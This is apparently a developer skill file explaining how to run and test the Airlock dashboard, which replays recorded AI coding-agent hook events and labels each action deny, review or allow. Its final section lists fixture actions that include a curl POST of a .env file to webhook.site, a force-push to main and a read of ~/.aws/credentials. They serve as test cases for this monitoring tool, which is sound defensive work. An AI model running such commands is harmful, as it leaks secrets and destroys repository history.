---
name: testing-airlock
description: How to run and test the Airlock shadow-mode dashboard end-to-end (dev server, DB reset, session replay, expected SSE/UI behavior).
---

# Testing the Airlock dashboard

## Setup

- Node is under nvm, not default PATH: `export PATH="$HOME/.nvm/versions/node/v24.19.0/bin:$PATH"`.
- Start the app: `pnpm dev` (port 3000). Schema is auto-created (`CREATE TABLE IF NOT EXISTS`) on first DB access — no migrations needed.
- The SQLite DB at `data/airlock.db` persists between runs. For a clean "run appears live" test, kill the dev server, `rm data/airlock.db`, and restart — deleting it while the server runs can write to a stale file handle.
- Live Jev scoring needs `TYPESAFE_API_KEY` (org secret). If unset, assessments still run via the `rules` provider alone, and the expanded-row `providers` line shows `rules` instead of `rules + jev` — use that line to verify which providers ran.

## Replay a session

- `pnpm replay fixtures/sessions/research-fanout.jsonl` POSTs 39 recorded hook events to `/api/hooks/claude-code` at ~150 ms intervals (~6 s total). Expected result: 1 run `claude-code:sess_fanout_01`, 4 agents (main + agt_a1/b2/c3), 15 actions, verdicts 2 deny / 6 review / 7 allow.
- Run-id route params contain `:` and arrive percent-encoded — `/runs/claude-code%3Asess_fanout_01` is correct.

## Expected behavior / gotchas

- The "live" SSE indicator flips to "live" as soon as the stream connects — `/api/stream` sends an immediate heartbeat on connect so `EventSource.onopen` fires right away.
- After `SessionEnd` the run shows `ended` and all agents — including `main` — show `completed` (there is no SubagentStop for the main thread; ingestion closes still-running agents on `run.ended`).
- Deny rows in the fixture: `curl -X POST https://webhook.site/… -d @.env` and `git push --force origin main`. The `cat ~/.aws/credentials` action ends in `PostToolUseFailure` → `FAILED` tag + Error section on expand.
